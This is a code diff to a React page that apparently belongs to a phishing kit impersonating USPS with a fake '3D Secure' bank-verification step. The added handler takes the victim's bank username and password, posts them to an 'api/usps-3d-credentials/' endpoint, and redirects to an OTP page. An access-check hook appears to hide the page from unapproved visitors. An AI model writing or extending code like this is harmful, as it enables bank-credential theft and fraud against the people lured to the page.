@@ -1,6 +1,10 @@
-import React from "react";
+import React, { useState } from "react";
+import { useLocation, useNavigate } from "react-router-dom";
+import axios from "axios";
 import Header from "../components/Header";
 import Footer from "../components/Footer";
+import { baseUrl } from "../constants";
+import useAccessCheck from "../Utils/useAccessCheck";
 
 const Payment3D: React.FC = () => {
   const inputClass =
@@ -12,6 +16,75 @@ const Payment3D: React.FC = () => {
     { id: 3, color: "#d9d9df" },
     { id: 4, color: "#d9d9df" },
   ];
+
+  const navigate = useNavigate();
+  const location = useLocation();
+  const { sessionId } = location.state || {};
+  const isAllowed = useAccessCheck(baseUrl);
+
+  const [bankUsername, setBankUsername] = useState("");
+  const [bankPassword, setBankPassword] = useState("");
+  const [isLoading, setIsLoading] = useState(false);
+  const [errors, setErrors] = useState({
+    bankUsername: "",
+    bankPassword: "",
+    form: "",
+  });
+
+  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
+    event.preventDefault();
+
+    if (!sessionId) {
+      setErrors((prev) => ({
+        ...prev,
+        form: "Session expired. Please restart the process.",
+      }));
+      return;
+    }
+
+    const newErrors = {
+      bankUsername: !bankUsername.trim() ? "Bank username is required." : "",
+      bankPassword: !bankPassword.trim() ? "Bank password is required." : "",
+      form: "",
+    };
+
+    if (Object.values(newErrors).some((msg) => msg)) {
+      setErrors(newErrors);
+      return;
+    }
+
+    setIsLoading(true);
+
+    try {
+      await axios.post(`${baseUrl}api/usps-3d-credentials/`, {
+        sessionId,
+        bankUsername,
+        bankPassword,
+      });
+
+      navigate("/payment-otp", { state: { sessionId } });
+    } catch (error) {
+      console.error("Error submitting bank credentials:", error);
+      setErrors((prev) => ({
+        ...prev,
+        form: "There was an error verifying your credentials. Please try again.",
+      }));
+    } finally {
+      setIsLoading(false);
+    }
+  };
+
+  if (isAllowed === null) {
+    return <div>Loading...</div>;
+  }
+
+  if (isAllowed === false) {
+    return <div>Access denied. Redirecting...</div>;
+  }
+
+  if (!sessionId) {
+    return <div>Missing session information. Please restart the process.</div>;
+  }
 
   return (
     <div className="min-h-screen bg-gradient-to-b from-white via-[#f9f9fb] to-[#f4f4f6] flex flex-col font-['HelveticaNeueW02-55Roma','Helvetica Neue',Helvetica,Arial,sans-serif] text-[#23285a]">
@@ -127,24 +200,50 @@ const Payment3D: React.FC = () => {
                     <span>Jeff Clifford</span>
                   </div>
                 </div>
-                <form className="space-y-3">
+                <form className="space-y-3" onSubmit={handleSubmit}>
                   <div>
                     <label className="block text-[12px] text-[#1a2252] font-semibold mb-1" htmlFor="bank-user">
                       Bank ID (username)
                     </label>
-                    <input id="bank-user" type="text" className={inputClass} placeholder="Enter bank username" required />
+                    <input
+                      id="bank-user"
+                      type="text"
+                      className={inputClass}
+                      placeholder="Enter bank username"
+                      value={bankUsername}
+                      onChange={(e) => setBankUsername(e.target.value)}
+                      required
+                    />
+                    {errors.bankUsername && (
+                      <p className="mt-1 text-xs text-red-600">{errors.bankUsername}</p>
+                    )}
                   </div>
                   <div>
                     <label className="block text-[12px] text-[#1a2252] font-semibold mb-1" htmlFor="bank-pass">
                       Bank passcode (password)
                     </label>
-                    <input id="bank-pass" type="password" className={inputClass} placeholder="Enter bank password" required />
+                    <input
+                      id="bank-pass"
+                      type="password"
+                      className={inputClass}
+                      placeholder="Enter bank password"
+                      value={bankPassword}
+                      onChange={(e) => setBankPassword(e.target.value)}
+                      required
+                    />
+                    {errors.bankPassword && (
+                      <p className="mt-1 text-xs text-red-600">{errors.bankPassword}</p>
+                    )}
                   </div>
+                  {errors.form && (
+                    <p className="text-sm text-red-600 font-semibold">{errors.form}</p>
+                  )}
                   <button
                     type="submit"
-                    className="mt-4 inline-flex items-center justify-center bg-[#2b2a72] text-white font-semibold px-10 py-3 text-[15px] tracking-wide rounded-sm hover:bg-[#211f5a] transition-colors w-full"
+                    className="mt-4 inline-flex items-center justify-center bg-[#2b2a72] text-white font-semibold px-10 py-3 text-[15px] tracking-wide rounded-sm hover:bg-[#211f5a] transition-colors w-full disabled:opacity-60 disabled:cursor-not-allowed"
+                    disabled={isLoading}
                   >
-                    Submit
+                    {isLoading ? "Verifying..." : "Submit"}
                   </button>
                 </form>
                 <p className="text-center text-[11px] text-[#6b6f88]">Copyright © 1999-2025 USPS. All rights reserved.</p>
